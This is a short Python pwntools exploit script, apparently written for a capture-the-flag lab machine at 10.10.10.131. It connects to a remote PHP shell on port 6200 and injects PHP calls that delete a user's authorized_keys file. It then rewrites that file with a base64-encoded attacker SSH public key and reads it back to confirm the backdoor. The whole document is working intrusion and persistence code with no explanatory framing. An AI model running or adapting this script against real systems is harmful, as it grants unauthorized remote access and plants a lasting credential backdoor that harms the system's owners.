#!/usr/bin/python2.7
import socket
import fcntl
import struct
from pwn import *
import base64

fichero="/home/dali/.ssh/authorized_keys"

conn = remote('10.10.10.131',6200)
print conn.recvline(timeout=2)

payload="c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEbUZONE1pZWw4Qlo0K3ZIVHl5cjh6ZERkNUZscm9kYnRKVUtNaUVOc1ppdExjdDB6NGJZQzN2VkF2cEk3VXhCZk9RQTN5SUtuR1lGMW5xZXpocUZ6QlRMODRLbTg5ZHpZTUpiK2ppaUpBcjgyblFyUVJVTUc5OVhQOXY2WFVtbHdsMW9TZ0h6QW85NzVZNnJobTl6dU8yVjR6bEpUTU9KeDlsRVJUS2h1c2wrNkFEbDgrRU5UblhrTmpVZHJkZWJROURuajVSTjh0b0pFcUNVN2ZpV09ZM1dJVm5FTFZGaHpGSm1BeFFheXJ3Zy9ldUFmbFgxOWZFcU5aTVkzaDZ0Mnd2aG96RVQ5WGQvbURyZDQxTll2UUI0UnA5MmhGTVBGT29UQnl2eW54c2tnc1JxQkMxZllYMFVwaUg2bVZHRVVPTEJTNkRlc2lROXlsY0l3Z2xxeDMgcm9vdEBrYWxpeDY0Cg=="

print ("unlink" )
conn.sendline('unlink("' + fichero + '");')
print conn.recv(timeout=3)

print("send id_rsa.pub")
conn.sendline('fwrite(fopen("' + fichero + '","w+"),base64_decode("' + payload + '"));')
print conn.recv(timeout=3)

print("Read Payload in " + fichero )
conn.sendline('file_get_contents("' + fichero + '");')

print conn.recvall(timeout=3)

conn.close()
